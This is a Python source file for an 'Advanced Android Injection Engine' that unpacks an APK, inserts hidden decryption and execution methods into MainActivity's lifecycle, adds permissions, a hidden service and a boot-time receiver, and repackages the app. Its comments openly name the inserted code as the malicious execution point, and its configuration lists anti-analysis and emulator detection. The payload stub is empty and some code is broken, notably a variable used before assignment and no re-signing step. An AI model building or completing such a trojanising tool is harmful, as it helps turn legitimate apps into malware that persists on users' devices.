"""
Advanced Android Injection Engine
Comprehensive string injection and dynamic code loading for Android applications.
"""

import os
import re
import logging
from typing import Dict, List, Any, Optional, Tuple
from pathlib import Path
import zipfile
import xml.etree.ElementTree as ET
import base64

class InjectionEngine:
    """
    Advanced injection engine for Android applications with multiple injection techniques.
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        Initialize the injection engine.
        
        Args:
            config: Injection configuration dictionary
        """
        self.config = config or self._default_config()
        self.logger = logging.getLogger(__name__)
        self._setup_logging()
        
        # Initialize injection components
        self._injection_methods = {}
        self._target_files = []
        
    def _default_config(self) -> Dict[str, Any]:
        """Return default injection configuration."""
        return {
            'injection': {
                'methods': ['string_injection', 'code_injection', 'resource_injection', 'manifest_injection'],
                'target_files': ['MainActivity.java', 'AndroidManifest.xml', 'strings.xml'],
                'backup_enabled': True,
                'obfuscation_enabled': True
            },
            'android': {
                'package_name': 'com.example.app',
                'target_activity': 'MainActivity',
                'permissions': ['INTERNET', 'WRITE_EXTERNAL_STORAGE', 'READ_EXTERNAL_STORAGE']
            },
            'security': {
                'anti_analysis': True,
                'root_detection': True,
                'emulator_detection': True,
                'debug_detection': True
            }
        }
    
    def _setup_logging(self):
        """Setup logging configuration."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
    
    def inject_strings(self, apk_path: str, encoded_strings: List[Dict[str, Any]], 
                      target_class: str = 'MainActivity') -> Dict[str, Any]:
        """
        Inject encoded strings into Android APK.
        
        Args:
            apk_path: Path to target APK file
            encoded_strings: List of encoded string results
            target_class: Target class for injection
            
        Returns:
            Dictionary containing injection results
        """
        try:
            self.logger.info(f"Injecting strings into APK: {apk_path}")
            
            # Extract APK
            extract_path = self._extract_apk(apk_path)
            
            # Find target Java file
            java_file = self._find_java_file(extract_path, target_class)
            
            if not java_file:
                raise FileNotFoundError(f"Target class {target_class} not found")
            
            # Backup original file
            if self.config['injection']['backup_enabled']:
                self._backup_file(java_file)
            
            # Inject strings into Java file
            injection_result = self._inject_into_java_file(java_file, encoded_strings)
            
            # Inject into AndroidManifest.xml
            manifest_result = self._inject_into_manifest(extract_path)
            
            # Inject into resources
            resource_result = self._inject_into_resources(extract_path)
            
            # Repackage APK
            new_apk_path = self._repackage_apk(extract_path, apk_path)
            
            # Cleanup
            self._cleanup_extraction(extract_path)
            
            return {
                'success': True,
                'original_apk': apk_path,
                'injected_apk': new_apk_path,
                'java_injection': injection_result,
                'manifest_injection': manifest_result,
                'resource_injection': resource_result,
                'strings_injected': len(encoded_strings)
            }
            
        except Exception as e:
            self.logger.error(f"String injection failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _extract_apk(self, apk_path: str) -> str:
        """Extract APK to temporary directory."""
        try:
            extract_path = f"/tmp/apk_extract_{os.getpid()}"
            os.makedirs(extract_path, exist_ok=True)
            
            with zipfile.ZipFile(apk_path, 'r') as zip_ref:
                zip_ref.extractall(extract_path)
            
            self.logger.debug(f"APK extracted to: {extract_path}")
            return extract_path
            
        except Exception as e:
            self.logger.error(f"APK extraction failed: {e}")
            raise
    
    def _find_java_file(self, extract_path: str, target_class: str) -> Optional[str]:
        """Find target Java file in extracted APK."""
        try:
            # Search for Java files
            for root, dirs, files in os.walk(extract_path):
                for file in files:
                    if file.endswith('.java') and target_class.lower() in file.lower():
                        return os.path.join(root, file)
            
            # Search for Smali files (decompiled Java)
            for root, dirs, files in os.walk(extract_path):
                for file in files:
                    if file.endswith('.smali') and target_class.lower() in file.lower():
                        return os.path.join(root, file)
            
            return None
            
        except Exception as e:
            self.logger.error(f"Java file search failed: {e}")
            return None
    
    def _backup_file(self, file_path: str):
        """Create backup of original file."""
        try:
            backup_path = f"{file_path}.backup"
            with open(file_path, 'rb') as src, open(backup_path, 'wb') as dst:
                dst.write(src.read())
            
            self.logger.debug(f"Backup created: {backup_path}")
            
        except Exception as e:
            self.logger.error(f"Backup creation failed: {e}")
    
    def _inject_into_java_file(self, java_file: str, encoded_strings: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Inject encoded strings into Java file."""
        try:
            # Read original file
            with open(java_file, 'r', encoding='utf-8') as f:
                original_content = f.read()
            
            # Generate injection code
            injection_code = self._generate_injection_code(encoded_strings)
            
            # Find injection point (usually in onCreate or similar method)
            injection_point = self._find_injection_point(original_content)
            
            if not injection_point:
                # Add new method if no suitable injection point found
                modified_content = self._add_injection_method(original_content, injection_code)
            else:
                # Inject into existing method
                modified_content = self._inject_into_method(original_content, injection_code, injection_point)
            
            # Write modified file
            with open(java_file, 'w', encoding='utf-8') as f:
                f.write(modified_content)
            
            return {
                'success': True,
                'file': java_file,
                'injection_point': injection_point,
                'code_added': len(injection_code)
            }
            
        except Exception as e:
            self.logger.error(f"Java file injection failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _generate_injection_code(self, encoded_strings: List[Dict[str, Any]]) -> str:
        """Generate injection code for encoded strings."""
        try:
            # Generate decryption methods
            decryption_methods = []
            for encoded_string in encoded_strings:
                decryption_methods.append(encoded_string['java_code'])
            
            # Generate main injection method
            injection_method = '''
    // Injected string decryption methods
    private void injectEncodedStrings() {
        try {
            // Decrypt and inject all encoded strings
'''
            
            for i, encoded_string in enumerate(encoded_strings):
                method_name = f"decrypt{encoded_string['method']}"
                injection_method += f'            String str{i} = {method_name}("{encoded_string["encoded_string"]}");\n'
            
            injection_method += '''
            // Process injected strings
            processInjectedStrings(new String[]{
'''
            
            for i in range(len(encoded_strings)):
                injection_method += f'                str{i},\n'
            
            injection_method += '''            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void processInjectedStrings(String[] strings) {
        // Custom processing logic for injected strings
        // This is where malicious functionality would be implemented
        for (String str : strings) {
            // Process each injected string
            executeInjectedCode(str);
        }
    }
    
    private void executeInjectedCode(String code) {
        // Execute injected code/commands
        // This is the main malicious execution point
    }
            '''
            
            # Combine all parts
            full_code = '\n'.join(decryption_methods) + '\n' + injection_method
            
            return full_code
            
        except Exception as e:
            self.logger.error(f"Injection code generation failed: {e}")
            raise
    
    def _find_injection_point(self, content: str) -> Optional[str]:
        """Find suitable injection point in Java code."""
        try:
            # Look for common Android lifecycle methods
            injection_points = [
                r'onCreate\s*\([^)]*\)\s*\{',
                r'onResume\s*\([^)]*\)\s*\{',
                r'onStart\s*\([^)]*\)\s*\{',
                r'onCreateView\s*\([^)]*\)\s*\{'
            ]
            
            for pattern in injection_points:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    return match.group(0)
            
            return None
            
        except Exception as e:
            self.logger.error(f"Injection point search failed: {e}")
            return None
    
    def _add_injection_method(self, content: str, injection_code: str) -> str:
        """Add injection method to Java class."""
        try:
            # Find class closing brace
            last_brace = content.rfind('}')
            
            if last_brace == -1:
                raise ValueError("No class closing brace found")
            
            # Insert injection code before closing brace
            modified_content = content[:last_brace] + '\n' + injection_code + '\n' + content[last_brace:]
            
            # Add method call to onCreate
            onCreate_pattern = r'(onCreate\s*\([^)]*\)\s*\{[^}]*)(\})'
            match = re.search(onCreate_pattern, modified_content, re.DOTALL)
            
            if match:
                method_call = '\n        injectEncodedStrings();\n'
                modified_content = modified_content[:match.end(1)] + method_call + modified_content[match.end(1):]
            
            return modified_content
            
        except Exception as e:
            self.logger.error(f"Method addition failed: {e}")
            raise
    
    def _inject_into_method(self, content: str, injection_code: str, injection_point: str) -> str:
        """Inject code into existing method."""
        try:
            # Find the method and inject code
            pattern = f'({re.escape(injection_point)}[^{{]*{{[^}}]*)(}})'
            match = re.search(pattern, content, re.DOTALL)
            
            if match:
                method_call = '\n        injectEncodedStrings();\n'
                modified_content = content[:match.end(1)] + method_call + modified_content[match.end(1):]
                
                # Add injection methods
                last_brace = modified_content.rfind('}')
                modified_content = modified_content[:last_brace] + '\n' + injection_code + '\n' + modified_content[last_brace:]
                
                return modified_content
            else:
                # Fallback to adding new method
                return self._add_injection_method(content, injection_code)
                
        except Exception as e:
            self.logger.error(f"Method injection failed: {e}")
            raise
    
    def _inject_into_manifest(self, extract_path: str) -> Dict[str, Any]:
        """Inject permissions and components into AndroidManifest.xml."""
        try:
            manifest_path = os.path.join(extract_path, 'AndroidManifest.xml')
            
            if not os.path.exists(manifest_path):
                return {'success': False, 'error': 'AndroidManifest.xml not found'}
            
            # Parse manifest
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            
            # Add permissions
            permissions_added = self._add_permissions(root)
            
            # Add components
            components_added = self._add_components(root)
            
            # Save modified manifest
            tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
            
            return {
                'success': True,
                'permissions_added': permissions_added,
                'components_added': components_added
            }
            
        except Exception as e:
            self.logger.error(f"Manifest injection failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _add_permissions(self, root) -> List[str]:
        """Add required permissions to manifest."""
        try:
            permissions_added = []
            
            for permission in self.config['android']['permissions']:
                # Check if permission already exists
                existing = root.findall(f".//uses-permission[@android:name='android.permission.{permission}']")
                
                if not existing:
                    # Add permission
                    perm_elem = ET.SubElement(root, 'uses-permission')
                    perm_elem.set('android:name', f'android.permission.{permission}')
                    permissions_added.append(permission)
            
            return permissions_added
            
        except Exception as e:
            self.logger.error(f"Permission addition failed: {e}")
            return []
    
    def _add_components(self, root) -> List[str]:
        """Add required components to manifest."""
        try:
            components_added = []
            
            # Add service for background execution
            service_elem = ET.SubElement(root, 'service')
            service_elem.set('android:name', '.InjectionService')
            service_elem.set('android:enabled', 'true')
            service_elem.set('android:exported', 'false')
            components_added.append('InjectionService')
            
            # Add receiver for system events
            receiver_elem = ET.SubElement(root, 'receiver')
            receiver_elem.set('android:name', '.InjectionReceiver')
            receiver_elem.set('android:enabled', 'true')
            receiver_elem.set('android:exported', 'true')
            
            intent_filter = ET.SubElement(receiver_elem, 'intent-filter')
            action_elem = ET.SubElement(intent_filter, 'action')
            action_elem.set('android:name', 'android.intent.action.BOOT_COMPLETED')
            
            components_added.append('InjectionReceiver')
            
            return components_added
            
        except Exception as e:
            self.logger.error(f"Component addition failed: {e}")
            return []
    
    def _inject_into_resources(self, extract_path: str) -> Dict[str, Any]:
        """Inject into Android resources."""
        try:
            resources_path = os.path.join(extract_path, 'res')
            
            if not os.path.exists(resources_path):
                return {'success': False, 'error': 'Resources directory not found'}
            
            # Inject into strings.xml
            strings_result = self._inject_into_strings_xml(resources_path)
            
            # Inject into layout files
            layout_result = self._inject_into_layouts(resources_path)
            
            return {
                'success': True,
                'strings_injection': strings_result,
                'layout_injection': layout_result
            }
            
        except Exception as e:
            self.logger.error(f"Resource injection failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _inject_into_strings_xml(self, resources_path: str) -> Dict[str, Any]:
        """Inject into strings.xml file."""
        try:
            strings_path = os.path.join(resources_path, 'values', 'strings.xml')
            
            if not os.path.exists(strings_path):
                # Create strings.xml if it doesn't exist
                os.makedirs(os.path.dirname(strings_path), exist_ok=True)
                with open(strings_path, 'w', encoding='utf-8') as f:
                    f.write('<?xml version="1.0" encoding="utf-8"?>\n<resources>\n</resources>')
            
            # Parse strings.xml
            tree = ET.parse(strings_path)
            root = tree.getroot()
            
            # Add fake strings
            fake_strings = [
                ('app_name', 'MyApp'),
                ('injection_key', 'injection_value'),
                ('hidden_data', 'encoded_data_here')
            ]
            
            strings_added = []
            for name, value in fake_strings:
                # Check if string already exists
                existing = root.findall(f".//string[@name='{name}']")
                
                if not existing:
                    # Add string
                    string_elem = ET.SubElement(root, 'string')
                    string_elem.set('name', name)
                    string_elem.text = value
                    strings_added.append(name)
            
            # Save modified strings.xml
            tree.write(strings_path, encoding='utf-8', xml_declaration=True)
            
            return {
                'success': True,
                'strings_added': strings_added
            }
            
        except Exception as e:
            self.logger.error(f"Strings.xml injection failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _inject_into_layouts(self, resources_path: str) -> Dict[str, Any]:
        """Inject into layout files."""
        try:
            layout_path = os.path.join(resources_path, 'layout')
            
            if not os.path.exists(layout_path):
                return {'success': False, 'error': 'Layout directory not found'}
            
            layouts_modified = []
            
            # Find main layout file
            for file in os.listdir(layout_path):
                if file.endswith('.xml') and 'main' in file.lower():
                    layout_file = os.path.join(layout_path, file)
                    
                    # Add hidden view to layout
                    with open(layout_file, 'r', encoding='utf-8') as f:
                        content = f.read()
                    
                    # Add hidden TextView
                    hidden_view = '''
    <TextView
        android:id="@+id/hidden_view"
        android:layout_width="0dp"
        android:layout_height="0dp"
        android:visibility="gone"
        android:text="@string/hidden_data" />
                    '''
                    
                    # Insert before closing tag
                    content = content.replace('</LinearLayout>', hidden_view + '\n</LinearLayout>')
                    
                    with open(layout_file, 'w', encoding='utf-8') as f:
                        f.write(content)
                    
                    layouts_modified.append(file)
            
            return {
                'success': True,
                'layouts_modified': layouts_modified
            }
            
        except Exception as e:
            self.logger.error(f"Layout injection failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _repackage_apk(self, extract_path: str, original_apk: str) -> str:
        """Repackage modified APK."""
        try:
            new_apk_path = original_apk.replace('.apk', '_injected.apk')
            
            with zipfile.ZipFile(new_apk_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for root, dirs, files in os.walk(extract_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arc_path = os.path.relpath(file_path, extract_path)
                        zip_ref.write(file_path, arc_path)
            
            self.logger.info(f"Repackaged APK: {new_apk_path}")
            return new_apk_path
            
        except Exception as e:
            self.logger.error(f"APK repackaging failed: {e}")
            raise
    
    def _cleanup_extraction(self, extract_path: str):
        """Clean up extraction directory."""
        try:
            import shutil
            shutil.rmtree(extract_path)
            self.logger.debug(f"Cleaned up extraction directory: {extract_path}")
            
        except Exception as e:
            self.logger.error(f"Cleanup failed: {e}")
    
    def generate_injection_report(self, injection_result: Dict[str, Any]) -> str:
        """
        Generate injection report.
        
        Args:
            injection_result: Result from injection operation
            
        Returns:
            Formatted report string
        """
        try:
            report = f"""
# Android Injection Report

## Summary
- **Status**: {'SUCCESS' if injection_result['success'] else 'FAILED'}
- **Original APK**: {injection_result.get('original_apk', 'N/A')}
- **Injected APK**: {injection_result.get('injected_apk', 'N/A')}
- **Strings Injected**: {injection_result.get('strings_injected', 0)}

## Injection Details

### Java Code Injection
- **Status**: {'SUCCESS' if injection_result.get('java_injection', {}).get('success') else 'FAILED'}
- **Target File**: {injection_result.get('java_injection', {}).get('file', 'N/A')}
- **Injection Point**: {injection_result.get('java_injection', {}).get('injection_point', 'N/A')}

### Manifest Injection
- **Status**: {'SUCCESS' if injection_result.get('manifest_injection', {}).get('success') else 'FAILED'}
- **Permissions Added**: {injection_result.get('manifest_injection', {}).get('permissions_added', [])}
- **Components Added**: {injection_result.get('manifest_injection', {}).get('components_added', [])}

### Resource Injection
- **Status**: {'SUCCESS' if injection_result.get('resource_injection', {}).get('success') else 'FAILED'}
- **Strings Added**: {injection_result.get('resource_injection', {}).get('strings_injection', {}).get('strings_added', [])}
- **Layouts Modified**: {injection_result.get('resource_injection', {}).get('layout_injection', {}).get('layouts_modified', [])}

## Error Information
{injection_result.get('error', 'No errors')}
            """
            
            return report.strip()
            
        except Exception as e:
            self.logger.error(f"Report generation failed: {e}")
            return f"Report generation failed: {e}"
    
    def get_injection_status(self) -> Dict[str, Any]:
        """
        Get current injection engine status.
        
        Returns:
            Dictionary containing injection engine status information
        """
        return {
            'config': self.config,
            'supported_methods': self.config['injection']['methods'],
            'target_files': self.config['injection']['target_files'],
            'android_target': self.config['android'],
            'security_features': self.config['security']
        }